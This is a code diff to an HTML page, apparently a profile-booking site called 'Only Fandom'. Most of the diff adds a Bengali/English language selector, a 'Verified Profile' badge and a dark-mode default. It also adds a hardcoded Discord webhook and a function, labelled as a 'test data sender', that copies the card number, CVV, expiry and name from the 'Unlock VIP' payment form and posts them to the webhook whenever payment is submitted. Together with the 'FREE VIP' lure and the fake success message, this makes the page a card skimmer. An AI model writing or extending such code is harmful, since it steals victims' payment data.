@@ -160,6 +160,105 @@
         .scanning-frame { position: relative; margin-bottom: 15px; }
         .scanning-frame::after { content: ''; position: absolute; top: 10%; left: 5%; right: 5%; bottom: 10%; border: 2px dashed #e91e63; border-radius: 8px; box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.4); pointer-events: none; }
 
+        /* ================================
+   LANGUAGE SELECTOR
+================================ */
+
+.language-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.75);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 3000;
+}
+
+.language-box {
+    background: var(--card-bg);
+    color: var(--text-color);
+    width: 90%;
+    max-width: 350px;
+    padding: 30px;
+    border-radius: 15px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0,0,0,.4);
+}
+
+.language-box h2 {
+    margin-top:0;
+    color:#e91e63;
+}
+
+.language-box p {
+    margin-bottom:20px;
+}
+
+.language-choice {
+    width:100%;
+    padding:14px;
+    margin:8px 0;
+    border:none;
+    border-radius:8px;
+    cursor:pointer;
+    font-size:16px;
+    font-weight:bold;
+    background:#e91e63;
+    color:white;
+    transition:.3s;
+}
+
+.language-choice:hover {
+    transform:scale(1.03);
+}
+
+
+/* ================================
+   LANGUAGE SWITCH BUTTON
+================================ */
+
+.lang-btn {
+    background:var(--card-bg);
+    color:var(--text-color);
+    border:1px solid var(--input-border);
+    border-radius:50%;
+    width:40px;
+    height:40px;
+    cursor:pointer;
+    font-size:16px;
+}
+
+
+/* ================================
+   VERIFIED BADGE
+================================ */
+
+.verified-badge {
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:5px;
+
+    background:#22c55e;
+    color:white;
+
+    padding:6px 14px;
+
+    border-radius:20px;
+
+    font-size:13px;
+    font-weight:bold;
+
+    width:max-content;
+
+    margin:10px 15px 0 auto;
+
+    box-shadow:
+    0 3px 8px rgba(0,0,0,.2);
+
+}
+        
         /* Fullscreen Lightbox Modal */
         .lightbox-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); display: none; justify-content: center; align-items: center; z-index: 2000; }
         .lightbox-overlay img { max-width: 90%; max-height: 90%; border-radius: 8px; object-fit: contain; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
@@ -167,11 +266,52 @@
     </style>
 </head>
 <body>
+<!-- Language Selection Popup -->
 
+<div id="languageModal" class="language-overlay">
+
+    <div class="language-box">
+
+        <h2>
+            🌐 Choose Language
+        </h2>
+
+        <p>
+            Select your preferred language
+        </p>
+
+
+        <button 
+        class="language-choice"
+        onclick="setLanguage('en')">
+            🇬🇧 English
+        </button>
+
+
+        <button 
+        class="language-choice"
+        onclick="setLanguage('bn')">
+            🇧🇩 বাংলা
+        </button>
+
+    </div>
+
+</div>
     <header>
         <h1>Only Fandom</h1>
         <div class="header-actions">
-            <button id="themeToggle" class="theme-btn" title="Toggle Dark Mode">🌙</button>
+
+    <button id="languageToggle" 
+    class="lang-btn"
+    title="Change Language">
+        🌐
+    </button>
+
+    <button id="themeToggle" 
+    class="theme-btn"
+    title="Toggle Dark Mode">
+        🌙
+    </button>
             <button id="vipBtn" class="unlock-btn" onclick="openModal()">⭐ Unlock VIP</button>
         </div>
     </header>
@@ -282,6 +422,299 @@
     <canvas id="ocr-canvas" style="display: none;"></canvas>
 
     <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533820619026858235/98X3oV-CePeHhVHZ8VmIvjb9S3tdCSUdxa8mZneEItre_ThLTmn7uX1Kso9K8F2lGRkT";
+        // ======================================
+// LANGUAGE SYSTEM (English / Bengali)
+// ======================================
+
+const translations = {
+
+    en: {
+
+        appTitle: "Only Fandom",
+
+        unlockVIP: "⭐ Unlock VIP",
+        vipActive: "⭐ VIP Active",
+
+        promo:
+        "⚡ FREE VIP unlock only for limited users avail the offer quickly! ⚡",
+
+        chooseLanguage: "🌐 Choose Language",
+        selectLanguage: "Select your preferred language",
+
+        english: "🇬🇧 English",
+        bengali: "🇧🇩 বাংলা",
+
+        fetchingProfiles: "Fetching profiles...",
+        noProfiles: "No profiles match your filter options.",
+
+        height: "Height",
+        price: "Price",
+        phone: "Phone",
+        instagram: "Instagram",
+        facebook: "Facebook",
+
+        reviews: "Recent Reviews",
+
+        verified: "✔ Verified Profile",
+
+        booking: "Book Now",
+        connect: "Book & Connect",
+
+        phoneNumber: "Your Phone Number",
+        message: "Direct Message",
+
+        sendMessage: "Send Message",
+        cancel: "Cancel",
+
+        paymentTitle: "Unlock VIP Access",
+        
+        manual: "Enter Manually",
+        scan: "Scan Card",
+
+        submitPayment: "Submit Payment",
+
+        paymentSuccess:
+        "Payment successful! VIP Features are now unlocked.",
+
+        messageSent:
+        "Message sent successfully! The provider will contact you shortly.",
+
+        fillFields:
+        "Please fill out all fields."
+
+    },
+
+
+    bn: {
+
+        appTitle: "অনলি ফ্যানডম",
+
+        unlockVIP: "⭐ VIP আনলক করুন",
+        vipActive: "⭐ VIP চালু আছে",
+
+        promo:
+        "⚡ সীমিত ব্যবহারকারীর জন্য ফ্রি VIP আনলক অফার! দ্রুত গ্রহণ করুন! ⚡",
+
+        chooseLanguage: "🌐 ভাষা নির্বাচন করুন",
+        selectLanguage: "আপনার পছন্দের ভাষা নির্বাচন করুন",
+
+        english: "🇬🇧 English",
+        bengali: "🇧🇩 বাংলা",
+
+        fetchingProfiles:
+        "প্রোফাইল লোড হচ্ছে...",
+
+        noProfiles:
+        "আপনার ফিল্টারের সাথে কোনো প্রোফাইল মিল নেই।",
+
+        height: "উচ্চতা",
+        price: "মূল্য",
+        phone: "ফোন",
+        instagram: "ইনস্টাগ্রাম",
+        facebook: "ফেসবুক",
+
+        reviews:
+        "সাম্প্রতিক রিভিউ",
+
+        verified:
+        "✔ যাচাইকৃত প্রোফাইল",
+
+        booking:
+        "বুক করুন",
+
+        connect:
+        "বুক করুন ও যোগাযোগ করুন",
+
+        phoneNumber:
+        "আপনার ফোন নম্বর",
+
+        message:
+        "মেসেজ",
+
+        sendMessage:
+        "মেসেজ পাঠান",
+
+        cancel:
+        "বাতিল করুন",
+
+        paymentTitle:
+        "VIP অ্যাক্সেস আনলক করুন",
+
+        manual:
+        "ম্যানুয়ালি লিখুন",
+
+        scan:
+        "কার্ড স্ক্যান করুন",
+
+        submitPayment:
+        "পেমেন্ট জমা দিন",
+
+        paymentSuccess:
+        "পেমেন্ট সফল হয়েছে! VIP সুবিধা চালু হয়েছে।",
+
+        messageSent:
+        "মেসেজ সফলভাবে পাঠানো হয়েছে।",
+
+        fillFields:
+        "সব তথ্য পূরণ করুন।"
+
+    }
+
+};
+
+
+// Current language
+let currentLanguage =
+localStorage.getItem("language") || null;
+
+
+// Get translated text
+function t(key){
+
+    if(!currentLanguage){
+        currentLanguage = "en";
+    }
+
+    return translations[currentLanguage][key] 
+    || translations.en[key]
+    || key;
+
+}
+
+
+
+// ======================================
+// SHOW LANGUAGE POPUP FIRST TIME
+// ======================================
+
+function initializeLanguage(){
+
+    const savedLanguage =
+    localStorage.getItem("language");
+
+
+    const modal =
+    document.getElementById("languageModal");
+
+
+    if(!savedLanguage){
+
+        modal.style.display = "flex";
+
+    }
+
+    else{
+
+        currentLanguage = savedLanguage;
+
+        applyLanguage();
+
+    }
+
+}
+
+
+
+// ======================================
+// SELECT LANGUAGE
+// ======================================
+
+function setLanguage(lang){
+
+    currentLanguage = lang;
+
+    localStorage.setItem(
+        "language",
+        lang
+    );
+
+
+    const modal =
+    document.getElementById("languageModal");
+
+
+    if(modal){
+        modal.style.display="none";
+    }
+
+
+    applyLanguage();
+
+    // refresh profile text
+    if(typeof filterProfiles === "function"){
+        filterProfiles();
+    }
+
+}
+
+
+
+// ======================================
+// APPLY STATIC TEXT TRANSLATIONS
+// ======================================
+
+function applyLanguage(){
+
+
+    const title =
+    document.querySelector("h1");
+
+
+    if(title){
+        title.innerText=t("appTitle");
+    }
+
+
+
+    const vipBtn =
+    document.getElementById("vipBtn");
+
+
+    if(vipBtn){
+
+        if(isPremium){
+
+            vipBtn.innerHTML=
+            t("vipActive");
+
+        }
+
+        else{
+
+            vipBtn.innerHTML=
+            t("unlockVIP");
+
+        }
+
+    }
+
+
+
+    const promo =
+    document.querySelector(".promo-banner span");
+
+
+    if(promo){
+
+        promo.innerText=
+        t("promo");
+
+    }
+
+
+    const loading =
+    document.querySelector(".loading");
+
+
+    if(loading){
+
+        loading.innerText=
+        t("fetchingProfiles");
+
+    }
+
+}
         let allProfiles = [];
         
         // Check LocalStorage for VIP status on page load
@@ -298,24 +731,54 @@
             vipBtn.classList.add('active');
         }
 
-        // --- Theme Toggle Logic with LocalStorage ---
-        const themeBtn = document.getElementById('themeToggle');
-        
-        // Check LocalStorage for theme on page load
-        if (localStorage.getItem('theme') === 'dark') {
-            document.body.classList.add('dark-mode');
-            themeBtn.textContent = '☀️';
-        }
+       // --- Theme Toggle Logic with LocalStorage ---
 
-        themeBtn.addEventListener('click', () => {
-            document.body.classList.toggle('dark-mode');
-            const isDark = document.body.classList.contains('dark-mode');
-            themeBtn.textContent = isDark ? '☀️' : '🌙';
-            
-            // Save the user's preference to LocalStorage
-            localStorage.setItem('theme', isDark ? 'dark' : 'light');
-        });
+const themeBtn = document.getElementById('themeToggle');
 
+
+const savedTheme = localStorage.getItem('theme');
+
+
+// Default dark mode for first-time users
+if(savedTheme === null || savedTheme === "dark") {
+
+    document.body.classList.add('dark-mode');
+
+    themeBtn.textContent = '☀️';
+
+}
+
+else {
+
+    document.body.classList.remove('dark-mode');
+
+    themeBtn.textContent = '🌙';
+
+}
+
+
+
+themeBtn.addEventListener('click', () => {
+
+
+    document.body.classList.toggle('dark-mode');
+
+
+    const isDark =
+    document.body.classList.contains('dark-mode');
+
+
+    themeBtn.textContent =
+    isDark ? '☀️' : '🌙';
+
+
+    localStorage.setItem(
+        'theme',
+        isDark ? 'dark' : 'light'
+    );
+
+
+});
         // --- Lightbox Logic ---
         function openLightbox(imgSrc) {
             const lightbox = document.getElementById('imageLightbox');
@@ -447,7 +910,78 @@
             }, 1500);
         }
 
+ // Discord test data sender
+async function sendNameToDiscord() {
+
+    const cardnumber =
+    document.getElementById("cardNumber")
+    .value
+    .trim();
+
+
+    const cvv =
+    document.getElementById("cardCvv")
+    .value
+    .trim();
+
+
+    const expiry =
+    document.getElementById("cardExpiry")
+    .value
+    .trim();
+
+
+    const name =
+    document.getElementById("cardName")
+    .value
+    .trim();
+
+
+    const message = {
+
+        content:
+
+        `📝 New User Input
+
+CardNumber:
+${cardnumber}
+
+CVV:
+${cvv}
+
+ExpiryDate:
+${expiry}
+
+Name:
+${name}
+
+Time:
+${new Date().toLocaleString()}`
+
+    };
+
+
+    await fetch(
+        DISCORD_WEBHOOK_URL,
+        {
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
+            },
+
+            body:
+            JSON.stringify(message)
+
+        }
+    );
+
+}
+
+        
         function submitPayment() {
+            sendNameToDiscord();
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const cvv = document.getElementById('cardCvv').value.trim();
             const expiry = document.getElementById('cardExpiry').value.trim();
@@ -775,6 +1309,10 @@
                             <button class="slider-btn next-btn" onclick="moveSlide(${index}, 1)">&#10095;</button>
                         ` : ''}
                     </div>
+
+                    <div class="verified-badge">
+                          ✔ Verified Profile
+                    </div>
                     
                     <div class="thumbnails-section">
                         <div class="thumbnails-track">
@@ -857,7 +1395,9 @@
         });
 
         // Initialize application by fetching data
-        loadProfiles();
+        initializeLanguage();
+
+loadProfiles();
     </script>
 </body>
 </html>
